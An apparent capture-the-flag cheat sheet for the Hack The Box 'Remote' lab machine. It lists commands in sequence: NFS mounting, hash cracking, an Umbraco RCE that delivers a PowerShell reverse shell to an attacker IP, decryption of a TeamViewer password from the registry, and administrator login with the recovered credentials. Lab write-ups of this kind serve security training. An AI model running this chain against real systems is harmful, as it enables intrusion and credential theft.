## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

## 🔍 **Recon**

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.180
nmap -sV -sC -p 21,80,111,135,139,445,2049,5985,47001 -oA scans/nmap-tcpscripts 10.10.10.180
```

## 🌐 [**Web Enumeration**](HTTP)

- No specific commands listed for web recon (manual browsing used).
- Umbraco admin panel discovered at `/Umbraco`.

## 📂 **NFS Enumeration & Mounting**

```bash
showmount -e 10.10.10.180
mount -t nfs 10.10.10.180:/site_backups /mnt/
cd /mnt/App_Data
strings Umbraco.sdf | head
```

## 🔓 **Hash Cracking**

```bash
cat admin.sha1
# (file contains: b8be16afba8c314ad33d812f22a04991b90e2aaa)

hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force
```

## 💥 **Exploit (Umbraco RCE)**

```bash
# Prepare PowerShell reverse shell
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 443" >> shell.ps1

# Serve the payload
python3 -m http.server 80

# Run exploit (Python script edited to call shell.ps1)
python umbraco_rce_iex.py
```

## 🐚 **Catch Reverse Shell**

```bash
rlwrap nc -lvnp 443
```

## 🔎 **Post-Exploit Enumeration (TeamViewer found)**

```powershell
tasklist
cd 'HKLM:\software\wow6432node\teamviewer\version7'
get-itemproperty -path .
(get-itemproperty -path .).SecurityPasswordAES
```

## 🔑 **Decrypt TeamViewer Password (Python)**

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                    126, 141, 55, 107, 38, 57, 78, 91])
aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
print(f"[+] Found password: {password}")
```

## 🪟 [**Admin Access**](SMB)

```bash
# Validate admin creds
crackmapexec smb 10.10.10.180 -u administrator -p '!R3m0te!'

# Evil-WinRM shell
evil-winrm -u administrator -p '!R3m0te!' -i 10.10.10.180

# Optional alternatives
psexec.py 'administrator:!R3m0te!@10.10.10.180'
wmiexec.py 'administrator:!R3m0te!@10.10.10.180'
```

---

📎 **Write-up Link**: [HTB: Remote by 0xdf](https://0xdf.gitlab.io/2020/09/05/htb-remote.html)
